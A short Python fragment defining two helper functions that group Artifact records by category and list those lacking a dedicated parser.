def by_category() -> dict[str, list[Artifact]]:
    out: dict[str, list[Artifact]] = {}
    for art in ARTIFACTS:
        out.setdefault(art.category, []).append(art)
    return out


def open_gaps() -> list[Artifact]:
    """Artifacts with no dedicated parser yet — the bijection's outstanding debt."""
    return [a for a in ARTIFACTS if a.parser is None]


